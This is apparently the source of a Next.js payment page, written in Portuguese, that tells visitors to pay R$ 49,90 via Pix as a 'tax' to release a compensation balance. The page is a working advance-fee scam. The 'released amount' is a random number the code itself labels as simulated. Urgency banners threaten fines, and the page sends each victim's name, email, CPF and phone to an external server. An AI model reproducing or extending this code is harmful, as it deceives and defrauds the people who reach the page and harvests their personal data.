"use client";

import { useState, useEffect } from "react";
import axios from "axios";
import Timer from "./components/Timer";
// import Reclame from './components/Reclame';

interface UserData {
  nome: string;
  email: string;
  cpf: string;
  phone: string;
}

export default function Home() {
  const [pixQrCode, setPixQrCode] = useState<string | null>(null);
  const [pixCode, setPixCode] = useState<string | null>(null);
  const [transactionId, setTransactionId] = useState<string | null>(null); // Novo
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);

  const [showPopup, setShowPopup] = useState(false);
  const [valorLiberado, setValorLiberado] = useState<number | null>(null);



  const generatePix = async () => {
    // if (pixQrCode) return;

    const userData: UserData | null = JSON.parse(
      localStorage.getItem("userData") || "null"
    );
    if (!userData) return;

    setLoading(true);
    setError(null);
    setShowPopup(true); // Mostra popup

    // Simula valor sendo verificado
    const valor = Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
    setTimeout(() => {
      setValorLiberado(valor);
    }, 2500); // Depois de 2.5s mostra o valor

    try {
      const { nome, email, cpf, phone } = userData;
      const amount = 4990;
      const paymentMethod = "PIX";

      const response = await axios.post(
        "https://chatbot-agent-nnq2.onrender.com/create-transaction",
        {
          name: nome,
          email,
          cpf,
          phone,
          amount,
          paymentMethod,
        }
      );

      const { pixQrCode, pixCode, id } = response.data;

      setPixQrCode(pixQrCode);
      setPixCode(pixCode);
      setTransactionId(id);
      console.log(response)
    } catch (error) {
      console.error("Erro ao enviar dados:", error);
      setError("Ocorreu um erro ao gerar o Pix. Tente novamente.");
    } finally {
      setLoading(false);
    }
  };

  // Verificação automática do status
  useEffect(() => {
    if (!transactionId) return;

    const interval = setInterval(async () => {
      try {
        const res = await fetch(
          `https://chatbot-agent-nnq2.onrender.com/check-status/${transactionId}`
        );
        const data = await res.json();
        console.log(data);
        if (data.status === "APPROVED") {
          clearInterval(interval);
          console.log(data.status);
          window.location.href = "/upssel";
        }
      } catch (err) {
        console.error("Erro ao checar status:", err);
      }
    }, 5000); // Checa a cada 5 segundos

    return () => clearInterval(interval);
  }, [transactionId]);

  const handleCopy = () => {
    if (pixCode) {
      navigator.clipboard.writeText(pixCode).then(() => {
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      });
    }
  };

  return (
    <div className="bg-gray-100 h-full flex flex-col justify-between">
      <div className="bg-[#1f7f25]">
        <Timer />
        <img className="w-full" src="/banner.jpg" alt="" />
        <div className="m-auto text-white flex w-full max-w-3xl items-center justify-center gap-5 px-2 py-4 text-center font-bold">
          <p>
            ⚠️ ATENÇÃO! Regularize o Imposto agora para evitar Multas,
            Restrições e Complicações Financeiras. Após o pagamento, seu Saldo
            será liberado diretamente na conta vinculada à Chave PIX cadastrada.
            Não deixe para depois!
          </p>
        </div>
      </div>

      <div className="flex flex-col">

        <div className="rounded-xl p-6">
        {!pixQrCode && (
          <div className="mb-3 font-inter text-base text-center text-black font-bold">
            CLIQUE NO BOTÃO <p className="text-red-600"> &quot;GERAR PIX&quot;</p> ABAIXO,
            FAÇA O PAGAMENTO VIA PIX E RECEBA O VALOR DA SUA INDENIZAÇÃO
            IMEDIATAMENTE!
          </div>
        )}
          

          <div className="flex flex-col gap-3 sm:flex-row">
            <div
              className="flex w-full items-center justify-center gap-1 rounded p-3 text-lg font-bold border-2"
              style={{ borderColor: "rgb(33, 125, 44)" }}
            >
              <img src="pagamento/SVG.svg" alt="" />
            </div>
          </div>
        </div>

        {showPopup && (
          <div className="fixed inset-0 z-50 bg-[rgba(0,0,0,0.6)] flex items-center justify-center">
            <div className="bg-white max-w-md mx-auto p-6 rounded-xl shadow-lg text-center">
              {!valorLiberado ? (
                <>
                  <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-green-600 mx-auto mb-4"></div>
                  <p className="text-lg font-semibold text-gray-800">
                    Verificando o valor disponível para saque...
                  </p>
                </>
              ) : (
                <>
                  <h2 className="text-2xl font-bold text-green-700 mb-2">
                    💰 Valor Liberado!
                  </h2>
                  <p className="text-xl text-gray-800 font-semibold mb-4">
                    R${" "}
                    {valorLiberado.toLocaleString("pt-BR", {
                      minimumFractionDigits: 2,
                    })}
                  </p>
                  <p className="text-base text-gray-600 mb-4">
  Para pagar o valor de <strong>R$ 49,90</strong>, clique no botão &quot;Copiar código&quot;, copie o código ou escaneie o QR Code. Em seguida, vá até o seu banco, cole o código ou use o QR Code para realizar o pagamento. Após isso, o saldo será processado e liberado na sua conta.
</p>
{/* <button
                onClick={handleCopy}
                className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-lg transition-all duration-200"
              >
                {copied ? "Copiado!" : "Copiar código"}
              </button> */}
                  <button
                    onClick={() => setShowPopup(false)}
                    className="bg-green-700 text-white px-6 py-2 rounded-md mt-4 hover:bg-green-800 transition"
                  >
                    Entendi, prosseguir com pagamento
                  </button>
                </>
              )}
            </div>
          </div>
        )}

        {!pixQrCode && (
          <button
            className="bg-green-800 p-4 rounded-lg mx-auto text-white font-bold my-4"
            onClick={generatePix}
            disabled={loading || pixQrCode !== null}
          >
            {loading ? "GERANDO..." : "GERAR PIX"}
          </button>
        )}

        {error && <p className="text-red-500 mt-2">{error}</p>}

        {pixQrCode && (
          <div className="mt-4 mx-auto">
            <h3 className="font-bold text-center px-4">PAGAR PELO QRCODE OU COPIE O PIX NO BOTÃO &quot;COPIAR CÓDIGO&quot; LOGO ABAIXO</h3>
            <img src={pixQrCode} alt="QR Code do pagamento" className="mt-2 mx-auto" />

            
          </div>
        )}

        {pixCode && (
          <div>
            <div className="max-w-xl mx-auto p-6 rounded-2xl text-center mt-10">
              <h2 className="text-2xl font-semibold text-gray-800 mb-4">
                Copia e Cola Pix
              </h2>
              <textarea
                value={pixCode}
                readOnly
                className="w-full h-28 p-4 border border-gray-300 rounded-lg bg-gray-50 text-gray-800 text-sm mb-4 resize-none"
              />
              <button
                onClick={handleCopy}
                className="bg-blue-600 hover:bg-blue-700 text-white px-8 py-4 rounded-lg transition-all duration-200"
              >
                {copied ? "Copiado!" : "Copiar código"}
              </button>
              <div className="col-span-2 mt-3 rounded-md border p-4 mx-2 bg-gray-100">
           
              <p className="text-base text-gray-600 my-4 space-y-4">
  <p className="font-bold">DÚVIDAS SOBRE O PAGAMENTO<br/> <br/>Para liberar o valor, siga os passos abaixo:</p>
  <p>1. Clique no botão <strong>Gerar Pix</strong> abaixo.</p>
  <p>2. Vá até o seu banco e escolha a opção <strong>Pix</strong>.</p>
  <p>3. Escaneie o QR Code ou copie o código Pix clicando no botão &quot;Copiar código&quot;.</p>
  <p>4. Faça o pagamento de <strong>R$ 49,90</strong>.</p>
  <p>5. Depois do pagamento, o valor da sua indenização será transferido para sua conta.</p>
  {/* <p>Se tiver alguma dúvida, entre em contato com a gente!</p> */}
</p>

            </div>
            </div>
            
          </div>
        )}

        {/* <Reclame /> */}
      </div>

      <footer className="flex flex-col items-center justify-center p-6 bg-white ">
        <p className="text-md">Formas de pagamento</p>
        <img
          alt="logo do pix"
          loading="lazy"
          width="44"
          height="29"
          src="pix.svg"
          className="mt-2"
        />
      </footer>
    </div>
  );
}
